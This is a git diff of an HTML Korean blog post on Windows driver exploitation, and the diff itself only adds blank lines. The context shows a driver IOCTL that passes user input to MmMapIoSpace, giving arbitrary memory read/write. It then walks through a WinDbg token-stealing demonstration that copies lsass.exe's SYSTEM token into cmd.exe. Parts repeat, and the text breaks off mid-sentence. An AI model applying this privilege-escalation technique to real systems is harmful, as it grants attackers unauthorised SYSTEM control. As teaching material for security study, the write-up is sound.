@@ -29,6 +29,7 @@
 &lt;span class=&#34;hljs-comment&#34;&gt;// 0x0000000000000001&lt;/span&gt;
 
 DeviceIoControl(dHandle, &lt;span class=&#34;hljs-number&#34;&gt;0x81112F08&lt;/span&gt;, input_buff, &lt;span class=&#34;hljs-number&#34;&gt;0x40&lt;/span&gt;, output_buff, &lt;span class=&#34;hljs-number&#34;&gt;0x100c&lt;/span&gt;, &amp;amp;dwRet, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;))&lt;/code&gt;&lt;/pre&gt;
+
 &lt;p&gt;&lt;img src=&#34;/2021/07/28/l0ch/windows-driver-part3/2.png&#34; alt=&#34;windows-driver-part3/2.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;input buffer&amp;#xC758; &lt;code&gt;0x4141414141414141&lt;/code&gt;&amp;#xACFC; &lt;code&gt;0x00000001&lt;/code&gt;&amp;#xC774; &lt;code&gt;sub_1400063D0&lt;/code&gt;&amp;#xC758; &amp;#xD30C;&amp;#xB77C;&amp;#xBBF8;&amp;#xD130;&amp;#xB85C; &amp;#xCC28;&amp;#xB840;&amp;#xB300;&amp;#xB85C; &amp;#xB4E4;&amp;#xC5B4;&amp;#xAC04; &amp;#xAC83;&amp;#xC744; &amp;#xBCFC; &amp;#xC218; &amp;#xC788;&amp;#xB124;&amp;#xC694;. &lt;del&gt;&amp;#xB09C; &amp;#xC800; 0x41414141 &amp;#xBCFC; &amp;#xB54C; &amp;#xAE30;&amp;#xBD84;&amp;#xC774; &amp;#xC81C;&amp;#xC77C; &amp;#xC88B;&amp;#xB354;&amp;#xB77C;&lt;/del&gt;  &amp;#xD574;&amp;#xB2F9; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xB2E4;&amp;#xC2DC; &amp;#xBCF4;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;/2021/07/28/l0ch/windows-driver-part3/Untitled.png&#34; alt=&#34;windows-driver-part3/Untitled.png&#34;&gt;&lt;/p&gt;
@@ -41,6 +42,7 @@ DeviceIoControl(dHandle, &lt;span class=&#34;hljs-number&#34;&gt;0x81112F08&lt;/
     INT64 read_addr; 
     DWORD num_of_bytes;
 } READ_INPUT_BUFFER;&lt;/code&gt;&lt;/pre&gt;
+
 &lt;p&gt;&lt;code&gt;0x81112F08&lt;/code&gt;&amp;#xC758; input buffer structure&amp;#xB294; &amp;#xB2E4;&amp;#xC74C;&amp;#xACFC; &amp;#xAC19;&amp;#xC774; &amp;#xAD6C;&amp;#xC131;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
 &lt;p&gt;&amp;#xC774;&amp;#xC81C; user input&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &lt;code&gt;0x81112F08&lt;/code&gt; &amp;#xB8E8;&amp;#xD2F4;&amp;#xC758; &lt;code&gt;MmMapIoSpace&lt;/code&gt;&amp;#xC5D0; &amp;#xC784;&amp;#xC758;&amp;#xC758; &amp;#xBB3C;&amp;#xB9AC; &amp;#xC8FC;&amp;#xC18C;&amp;#xC640; &amp;#xB9E4;&amp;#xD551; &amp;#xC0AC;&amp;#xC774;&amp;#xC988;&amp;#xB97C; &amp;#xC904; &amp;#xC218; &amp;#xC788;&amp;#xACE0; &amp;#xD574;&amp;#xB2F9; &amp;#xC8FC;&amp;#xC18C;&amp;#xC5D0; &amp;#xB9E4;&amp;#xD551;&amp;#xB41C; &amp;#xAC00;&amp;#xC0C1; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xC77D;&amp;#xC744; &amp;#xC218; &amp;#xC788;&amp;#xC5B4; arbitrary read&amp;#xAC00; &amp;#xAC00;&amp;#xB2A5;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xBC18;&amp;#xB300;&amp;#xB85C; &amp;#xBB3C;&amp;#xB9AC; &amp;#xC8FC;&amp;#xC18C;&amp;#xC5D0; &amp;#xB9E4;&amp;#xD551;&amp;#xB41C; &amp;#xAC00;&amp;#xC0C1; &amp;#xC8FC;&amp;#xC18C;&amp;#xC5D0; &amp;#xAC12;&amp;#xC744; &amp;#xC4F0;&amp;#xB294; &lt;code&gt;0x81112F0C&lt;/code&gt; &amp;#xC758; &amp;#xB8E8;&amp;#xD2F4;&amp;#xB3C4; &amp;#xB3D9;&amp;#xC77C;&amp;#xD55C; &amp;#xBC29;&amp;#xC2DD;&amp;#xC73C;&amp;#xB85C; &amp;#xD30C;&amp;#xB77C;&amp;#xBBF8;&amp;#xD130;&amp;#xB97C; &amp;#xC804;&amp;#xB2EC;&amp;#xD558;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xB9E4;&amp;#xD551;&amp;#xB41C; &amp;#xAC00;&amp;#xC0C1; &amp;#xC8FC;&amp;#xC18C;&amp;#xC5D0; &amp;#xC6B0;&amp;#xB9AC;&amp;#xAC00; &amp;#xC784;&amp;#xC758;&amp;#xC758; &amp;#xAC12;&amp;#xC744; &amp;#xC4F8; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &lt;/p&gt;
 &lt;p&gt;arbitrary read/write primitive&amp;#xB97C; &amp;#xBAA8;&amp;#xB450; &amp;#xC5BB;&amp;#xC5C8;&amp;#xB124;&amp;#xC694;! &amp;#xC774;&amp;#xC81C; &amp;#xC774;&amp;#xAC78; &amp;#xC774;&amp;#xC6A9;&amp;#xD574; &amp;#xAD8C;&amp;#xD55C; &amp;#xC0C1;&amp;#xC2B9;&amp;#xC744; &amp;#xD558;&amp;#xBA74; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
@@ -66,6 +68,7 @@ PROCESS ffffe405af71c0c0
     Image: lsass.exe
 ..
 &lt;/code&gt;&lt;/pre&gt;
+
 &lt;p&gt;&amp;#xD604;&amp;#xC7AC; &amp;#xB514;&amp;#xBC84;&amp;#xAE30; &amp;#xBA38;&amp;#xC2E0;&amp;#xC5D0;&amp;#xC11C; &amp;#xB3CC;&amp;#xC544;&amp;#xAC00;&amp;#xB294; &amp;#xBAA8;&amp;#xB4E0; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4; &amp;#xB9AC;&amp;#xC2A4;&amp;#xD2B8;&amp;#xAC00; &amp;#xB739;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB108;&amp;#xBB34; &amp;#xB9CE;&amp;#xC73C;&amp;#xB2C8;.. &amp;#xBA87; &amp;#xAC1C; &amp;#xB098;&amp;#xC624;&amp;#xBA74; &amp;#xC911;&amp;#xB2E8;&amp;#xD558;&amp;#xACE0;, &lt;code&gt;lsass.exe&lt;/code&gt; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xB97C; &amp;#xC608;&amp;#xC2DC;&amp;#xB85C; &amp;#xB4E4;&amp;#xC5B4;&amp;#xBCF4;&amp;#xB3C4;&amp;#xB85D; &amp;#xD558;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.  &lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;lsass.exe : &amp;#xB85C;&amp;#xCEEC; &amp;#xBCF4;&amp;#xC548; &amp;#xC778;&amp;#xC99D; &amp;#xD558;&amp;#xC704; &amp;#xC2DC;&amp;#xC2A4;&amp;#xD15C; &amp;#xC11C;&amp;#xBE44;&amp;#xC2A4;. &amp;#xC2DC;&amp;#xC2A4;&amp;#xD15C;&amp;#xC758; &amp;#xBCF4;&amp;#xC548; &amp;#xC815;&amp;#xCC45;&amp;#xC744; &amp;#xAC15;&amp;#xD654;&amp;#xB97C; &amp;#xC704;&amp;#xD55C; &amp;#xC708;&amp;#xB3C4;&amp;#xC6B0;&amp;#xC758; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xC774;&amp;#xB2E4;. &amp;#xC774;&amp;#xAC83;&amp;#xC740; &amp;#xC708;&amp;#xB3C4;&amp;#xC6B0; &amp;#xCEF4;&amp;#xD4E8;&amp;#xD130;&amp;#xB098; &amp;#xC11C;&amp;#xBC84;&amp;#xC5D0; &amp;#xC811;&amp;#xC18D;&amp;#xD558;&amp;#xB294; &amp;#xC720;&amp;#xC800;&amp;#xB4E4;&amp;#xC758; &amp;#xB85C;&amp;#xADF8;&amp;#xC778;&amp;#xC744; &amp;#xAC80;&amp;#xC0AC;&amp;#xD558;&amp;#xBA70;, &amp;#xBE44;&amp;#xBC00;&amp;#xBC88;&amp;#xD638; &amp;#xBCC0;&amp;#xACBD;&amp;#xC744; &amp;#xAD00;&amp;#xB9AC;&amp;#xD558;&amp;#xACE0;, &amp;#xC561;&amp;#xC138;&amp;#xC2A4; &amp;#xD1A0;&amp;#xD070;&amp;#xC744; &amp;#xC0DD;&amp;#xC131;&amp;#xD55C;&amp;#xB2E4;. &amp;#xB610;&amp;#xD55C; Windows Security Log&amp;#xB97C; &amp;#xC791;&amp;#xC131;&amp;#xD55C;&amp;#xB2E4;.&lt;br&gt;(&amp;#xB531; &amp;#xBD10;&amp;#xB3C4; &amp;#xCEE4;&amp;#xB110; &amp;#xAD8C;&amp;#xD55C;&amp;#xC73C;&amp;#xB85C; &amp;#xC2E4;&amp;#xD589;&amp;#xB418;&amp;#xB294; &amp;#xB9E4;&amp;#xC6B0; &amp;#xB9E4;&amp;#xC6B0; &amp;#xC911;&amp;#xC694;&amp;#xD55C; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4; &amp;#xAC19;&amp;#xC544; &amp;#xBCF4;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;&amp;#x314E;&amp;#x314E;)&lt;/p&gt;
@@ -77,6 +80,7 @@ PROCESS ffffe405af71c0c0
    +&lt;span class=&#34;hljs-number&#34;&gt;0x5a8&lt;/span&gt; ImageFileName   : [&lt;span class=&#34;hljs-number&#34;&gt;15&lt;/span&gt;]  &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;lsass.exe&amp;quot;&lt;/span&gt;
 
 * &amp;#xC624;&amp;#xD504;&amp;#xC14B;&amp;#xC740; &amp;#xC708;&amp;#xB3C4;&amp;#xC6B0; &amp;#xBE4C;&amp;#xB4DC; &amp;#xBC84;&amp;#xC804;&amp;#xBCC4; &amp;#xC0C1;&amp;#xC774;&lt;/code&gt;&lt;/pre&gt;
+
 &lt;p&gt;&amp;#xC6B0;&amp;#xC120;&amp;#xC740; &amp;#xD574;&amp;#xB2F9; &amp;#xD544;&amp;#xB4DC;&amp;#xB4E4;&amp;#xC758; &amp;#xC624;&amp;#xD504;&amp;#xC14B;&amp;#xC744; &amp;#xAE30;&amp;#xC5B5;&amp;#xD558;&amp;#xC2DC;&amp;#xBA74; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xC81C; &amp;#xD558;&amp;#xB098;&amp;#xC529; &amp;#xC0B4;&amp;#xD3B4;&amp;#xBCF4;&amp;#xB3C4;&amp;#xB85D; &amp;#xD558;&amp;#xC8E0;!&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;code&gt;UniqueProcessId&lt;/code&gt; : &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4; ID(PID)&lt;/li&gt;
@@ -91,6 +95,7 @@ PROCESS ffffe405af71c0c0
     [+&lt;span class=&#34;hljs-number&#34;&gt;0x000&lt;/span&gt;] Object           : &lt;span class=&#34;hljs-number&#34;&gt;0xffff990bec2356bc&lt;/span&gt; [Type: &lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; *]
     [+&lt;span class=&#34;hljs-number&#34;&gt;0x000&lt;/span&gt; ( &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;)] RefCnt           : &lt;span class=&#34;hljs-number&#34;&gt;0xc&lt;/span&gt; [Type: &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int64]
     [+&lt;span class=&#34;hljs-number&#34;&gt;0x000&lt;/span&gt;] Value            : &lt;span class=&#34;hljs-number&#34;&gt;0xffff990bec2356bc&lt;/span&gt; [Type: &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int64]&lt;/code&gt;&lt;/pre&gt;
+
 &lt;p&gt;&lt;code&gt;Value&lt;/code&gt; &amp;#xD544;&amp;#xB4DC;&amp;#xAC00; &amp;#xBC14;&amp;#xB85C; &amp;#xAD8C;&amp;#xD55C; &amp;#xC2DD;&amp;#xBCC4; &amp;#xAC12;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC5B4;&amp;#xB5A0;&amp;#xD55C; &amp;#xAD8C;&amp;#xD55C;&amp;#xC774; &amp;#xC8FC;&amp;#xC5B4;&amp;#xC9C4; Token Value&amp;#xC778;&amp;#xC9C0;&amp;#xB294; &lt;code&gt;!token [Value &amp;amp; 0xffffffffffffffff0]&lt;/code&gt;&amp;#xC640; &amp;#xAC19;&amp;#xC774; &amp;#xD558;&amp;#xC704; 4bit&amp;#xB97C; 0&amp;#xC73C;&amp;#xB85C; &amp;#xB9CC;&amp;#xB4E4;&amp;#xC5B4; &amp;#xD655;&amp;#xC778;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;: kd&amp;gt; !token &lt;span class=&#34;hljs-number&#34;&gt;0xffff990bec2356b0&lt;/span&gt;
 _TOKEN &lt;span class=&#34;hljs-number&#34;&gt;0xffff990bec2356b0&lt;/span&gt;
@@ -117,6 +122,7 @@ Privs:
  &lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0x00000000a&lt;/span&gt; SeLoadDriverPrivilege             Attributes - 
  &lt;span class=&#34;hljs-number&#34;&gt;11&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0x00000000b&lt;/span&gt; SeSystemProfilePrivilege          Attributes - Enabled Default
 ...&lt;/code&gt;&lt;/pre&gt;
+
 &lt;p&gt;User&amp;#xB97C; &amp;#xBCF4;&amp;#xBA74; &lt;code&gt;S-1-5-18&lt;/code&gt; &amp;#xB85C; &amp;#xD45C;&amp;#xC2DC;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xB97C; SID(Security Identifier)&amp;#xB77C;&amp;#xACE0; &amp;#xD558;&amp;#xBA70;, &amp;#xAC01; &amp;#xC0AC;&amp;#xC6A9;&amp;#xC790;&amp;#xC758; SID&amp;#xB294; &lt;a href=&#34;https://renenyffenegger.ch/notes/Windows/security/SID/index&#34;&gt;https://renenyffenegger.ch/notes/Windows/security/SID/index&lt;/a&gt; &amp;#xC5D0;&amp;#xC11C; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;/2021/07/28/l0ch/windows-driver-part3/Untitled%201.png&#34; alt=&#34;windows-driver-part3/Untitled%201.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;NT AUTHORITY\SYSTEM&lt;/code&gt; &amp;#xACC4;&amp;#xC815;&amp;#xC758; &amp;#xAD8C;&amp;#xD55C;&amp;#xC778; &amp;#xAC83;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB124;&amp;#xC694;!&lt;/p&gt;
@@ -151,18 +157,27 @@ PROCESS ffffe405b50d1080
     [+&lt;span class=&#34;hljs-number&#34;&gt;0x000&lt;/span&gt;] Object           : &lt;span class=&#34;hljs-number&#34;&gt;0xffff990bf7037067&lt;/span&gt; [Type: &lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; *]
     [+&lt;span class=&#34;hljs-number&#34;&gt;0x000&lt;/span&gt; ( &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;)] RefCnt           : &lt;span class=&#34;hljs-number&#34;&gt;0x7&lt;/span&gt; [Type: &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int64]
     [+&lt;span class=&#34;hljs-number&#34;&gt;0x000&lt;/span&gt;] Value            : &lt;span class=&#34;hljs-number&#34;&gt;0xffff990bf7037067&lt;/span&gt; [Type: &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int64]&lt;/code&gt;&lt;/pre&gt;
+
+
+
 &lt;p&gt;Token&amp;#xC758; &amp;#xC704;&amp;#xCE58;&amp;#xB294; &lt;code&gt;ffffe405b50d1080 + 4b8 = ffffe405b50d1538&lt;/code&gt; &amp;#xC774; &amp;#xB418;&amp;#xACA0;&amp;#xB124;&amp;#xC694;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;: kd&amp;gt; dps FFFFE405B50D1538
 ffffe405`b50d1538  ffff990b`f7037067
 ffffe405`b50d1540  &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;
 ffffe405`b50d1548  &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;
 ffffe405`b50d1550  &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+
+
+
 &lt;p&gt;&amp;#xC774;&amp;#xC81C; &amp;#xC774; Token Value&amp;#xB97C; Windbg&amp;#xC758; memory edit&amp;#xAE30;&amp;#xB2A5;&amp;#xC73C;&amp;#xB85C; &amp;#xC544;&amp;#xAE4C; &lt;code&gt;lsass.exe&lt;/code&gt;&amp;#xC758; Token Value&amp;#xC778; &lt;code&gt;0xffff990bec2356bc&lt;/code&gt;&amp;#xB85C; &amp;#xBC14;&amp;#xAFC9;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;: kd&amp;gt; eq FFFFE405B50D1538 &lt;span class=&#34;hljs-number&#34;&gt;0xffff990bec2356bc&lt;/span&gt;
 &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;: kd&amp;gt; dps FFFFE405B50D1538
 ffffe405`b50d1538  ffff990b`ec2356bc
 ffffe405`b50d1540  &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;
 ffffe405`b50d1548  &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+
+
+
 &lt;p&gt;&amp;#xB2E4;&amp;#xC2DC; &amp;#xB514;&amp;#xBC84;&amp;#xAE30; &amp;#xBA38;&amp;#xC2E0;&amp;#xC73C;&amp;#xB85C; &amp;#xB3CC;&amp;#xC544;&amp;#xAC00; &lt;code&gt;cmd.exe&lt;/code&gt;&amp;#xC758; &amp;#xACC4;&amp;#xC815;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD558;&amp;#xBA74; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC774; &lt;code&gt;nt authority\system&lt;/code&gt; &amp;#xC73C;&amp;#xB85C; &amp;#xBC14;&amp;#xB010; &amp;#xAC83;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;!&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;/2021/07/28/l0ch/windows-driver-part3/Untitled%203.png&#34; alt=&#34;windows-driver-part3/Untitled%203.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;/2021/07/28/l0ch/windows-driver-part3/Untitled%204.png&#34; alt=&#34;windows-driver-part3/Untitled%204.png&#34;&gt;&lt;/p&gt;
@@ -195,6 +210,7 @@ ffffe405`b50d1548  &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;
 &lt;span class=&#34;hljs-comment&#34;&gt;// 0x0000000000000001&lt;/span&gt;
 
 DeviceIoControl(dHandle, &lt;span class=&#34;hljs-number&#34;&gt;0x81112F08&lt;/span&gt;, input_buff, &lt;span class=&#34;hljs-number&#34;&gt;0x40&lt;/span&gt;, output_buff, &lt;span class=&#34;hljs-number&#34;&gt;0x100c&lt;/span&gt;, &amp;amp;dwRet, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;))&lt;/code&gt;&lt;/pre&gt;
+
 &lt;p&gt;&lt;img src=&#34;/2021/07/28/l0ch/windows-driver-part3/2.png&#34; alt=&#34;windows-driver-part3/2.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;input buffer&amp;#xC758; &lt;code&gt;0x4141414141414141&lt;/code&gt;&amp;#xACFC; &lt;code&gt;0x00000001&lt;/code&gt;&amp;#xC774; &lt;code&gt;sub_1400063D0&lt;/code&gt;&amp;#xC758; &amp;#xD30C;&amp;#xB77C;&amp;#xBBF8;&amp;#xD130;&amp;#xB85C; &amp;#xCC28;&amp;#xB840;&amp;#xB300;&amp;#xB85C; &amp;#xB4E4;&amp;#xC5B4;&amp;#xAC04; &amp;#xAC83;&amp;#xC744; &amp;#xBCFC; &amp;#xC218; &amp;#xC788;&amp;#xB124;&amp;#xC694;. &lt;del&gt;&amp;#xB09C; &amp;#xC800; 0x41414141 &amp;#xBCFC; &amp;#xB54C; &amp;#xAE30;&amp;#xBD84;&amp;#xC774; &amp;#xC81C;&amp;#xC77C; &amp;#xC88B;&amp;#xB354;&amp;#xB77C;&lt;/del&gt;  &amp;#xD574;&amp;#xB2F9; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xB2E4;&amp;#xC2DC; &amp;#xBCF4;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;/2021/07/28/l0ch/windows-driver-part3/Untitled.png&#34; alt=&#34;windows-driver-part3/Untitled.png&#34;&gt;&lt;/p&gt;
@@ -207,6 +223,7 @@ DeviceIoControl(dHandle, &lt;span class=&#34;hljs-number&#34;&gt;0x81112F08&lt;/
     INT64 read_addr; 
     DWORD num_of_bytes;
 } READ_INPUT_BUFFER;&lt;/code&gt;&lt;/pre&gt;
+
 &lt;p&gt;&lt;code&gt;0x81112F08&lt;/code&gt;&amp;#xC758; input buffer structure&amp;#xB294; &amp;#xB2E4;&amp;#xC74C;&amp;#xACFC; &amp;#xAC19;&amp;#xC774; &amp;#xAD6C;&amp;#xC131;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
 &lt;p&gt;&amp;#xC774;&amp;#xC81C; user input&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &lt;code&gt;0x81112F08&lt;/code&gt; &amp;#xB8E8;&amp;#xD2F4;&amp;#xC758; &lt;code&gt;MmMapIoSpace&lt;/code&gt;&amp;#xC5D0; &amp;#xC784;&amp;#xC758;&amp;#xC758; &amp;#xBB3C;&amp;#xB9AC; &amp;#xC8FC;&amp;#xC18C;&amp;#xC640; &amp;#xB9E4;&amp;#xD551; &amp;#xC0AC;&amp;#xC774;&amp;#xC988;&amp;#xB97C; &amp;#xC904; &amp;#xC218; &amp;#xC788;&amp;#xACE0; &amp;#xD574;&amp;#xB2F9; &amp;#xC8FC;&amp;#xC18C;&amp;#xC5D0; &amp;#xB9E4;&amp;#xD551;&amp;#xB41C; &amp;#xAC00;&amp;#xC0C1; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xC77D;&amp;#xC744; &amp;#xC218; &amp;#xC788;&amp;#xC5B4; arbitrary read&amp;#xAC00; &amp;#xAC00;&amp;#xB2A5;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xBC18;&amp;#xB300;&amp;#xB85C; &amp;#xBB3C;&amp;#xB9AC; &amp;#xC8FC;&amp;#xC18C;&amp;#xC5D0; &amp;#xB9E4;&amp;#xD551;&amp;#xB41C; &amp;#xAC00;&amp;#xC0C1; &amp;#xC8FC;&amp;#xC18C;&amp;#xC5D0; &amp;#xAC12;&amp;#xC744; &amp;#xC4F0;&amp;#xB294; &lt;code&gt;0x81112F0C&lt;/code&gt; &amp;#xC758; &amp;#xB8E8;&amp;#xD2F4;&amp;#xB3C4; &amp;#xB3D9;&amp;#xC77C;&amp;#xD55C; &amp;#xBC29;&amp;#xC2DD;&amp;#xC73C;&amp;#xB85C; &amp;#xD30C;&amp;#xB77C;&amp;#xBBF8;&amp;#xD130;&amp;#xB97C; &amp;#xC804;&amp;#xB2EC;&amp;#xD558;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xB9E4;&amp;#xD551;&amp;#xB41C; &amp;#xAC00;&amp;#xC0C1; &amp;#xC8FC;&amp;#xC18C;&amp;#xC5D0; &amp;#xC6B0;&amp;#xB9AC;&amp;#xAC00; &amp;#xC784;&amp;#xC758;&amp;#xC758; &amp;#xAC12;&amp;#xC744; &amp;#xC4F8; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &lt;/p&gt;
 &lt;p&gt;arbitrary read/write primitive&amp;#xB97C; &amp;#xBAA8;&amp;#xB450; &amp;#xC5BB;&amp;#xC5C8;&amp;#xB124;&amp;#xC694;! &amp;#xC774;&amp;#xC81C; &amp;#xC774;&amp;#xAC78; &amp;#xC774;&amp;#xC6A9;&amp;#xD574; &amp;#xAD8C;&amp;#xD55C; &amp;#xC0C1;&amp;#xC2B9;&amp;#xC744; &amp;#xD558;&amp;#xBA74; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
@@ -232,6 +249,7 @@ PROCESS ffffe405af71c0c0
     Image: lsass.exe
 ..
 &lt;/code&gt;&lt;/pre&gt;
+
 &lt;p&gt;&amp;#xD604;&amp;#xC7AC; &amp;#xB514;&amp;#xBC84;&amp;#xAE30; &amp;#xBA38;&amp;#xC2E0;&amp;#xC5D0;&amp;#xC11C; &amp;#xB3CC;&amp;#xC544;&amp;#xAC00;&amp;#xB294; &amp;#xBAA8;&amp;#xB4E0; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4; &amp;#xB9AC;&amp;#xC2A4;&amp;#xD2B8;&amp;#xAC00; &amp;#xB739;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB108;&amp;#xBB34; &amp;#xB9CE;&amp;#xC73C;&amp;#xB2C8;.. &amp;#xBA87; &amp;#xAC1C; &amp;#xB098;&amp;#xC624;&amp;#xBA74; &amp;#xC911;&amp;#xB2E8;&amp;#xD558;&amp;#xACE0;, &lt;code&gt;lsass.exe&lt;/code&gt; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xB97C; &amp;#xC608;&amp;#xC2DC;&amp;#xB85C; &amp;#xB4E4;&amp;#xC5B4;&amp;#xBCF4;&amp;#xB3C4;&amp;#xB85D; &amp;#xD558;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.  &lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;lsass.exe : &amp;#xB85C;&amp;#xCEEC; &amp;#xBCF4;&amp;#xC548; &amp;#xC778;&amp;#xC99D; &amp;#xD558;&amp;#xC704; &amp;#xC2DC;&amp;#xC2A4;&amp;#xD15C; &amp;#xC11C;&amp;#xBE44;&amp;#xC2A4;. &amp;#xC2DC;&amp;#xC2A4;&amp;#xD15C;&amp;#xC758; &amp;#xBCF4;&amp;#xC548; &amp;#xC815;&amp;#xCC45;&amp;#xC744; &amp;#xAC15;&amp;#xD654;&amp;#xB97C; &amp;#xC704;&amp;#xD55C; &amp;#xC708;&amp;#xB3C4;&amp;#xC6B0;&amp;#xC758; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xC774;&amp;#xB2E4;. &amp;#xC774;&amp;#xAC83;&amp;#xC740; &amp;#xC708;&amp;#xB3C4;&amp;#xC6B0; &amp;#xCEF4;&amp;#xD4E8;&amp;#xD130;&amp;#xB098; &amp;#xC11C;&amp;#xBC84;&amp;#xC5D0; &amp;#xC811;&amp;#xC18D;&amp;#xD558;&amp;#xB294; &amp;#xC720;&amp;#xC800;&amp;#xB4E4;&amp;#xC758; &amp;#xB85C;&amp;#xADF8;&amp;#xC778;&amp;#xC744; &amp;#xAC80;&amp;#xC0AC;&amp;#xD558;&amp;#xBA70;, &amp;#xBE44;&amp;#xBC00;&amp;#xBC88;&amp;#xD638; &amp;#xBCC0;&amp;#xACBD;&amp;#xC744; 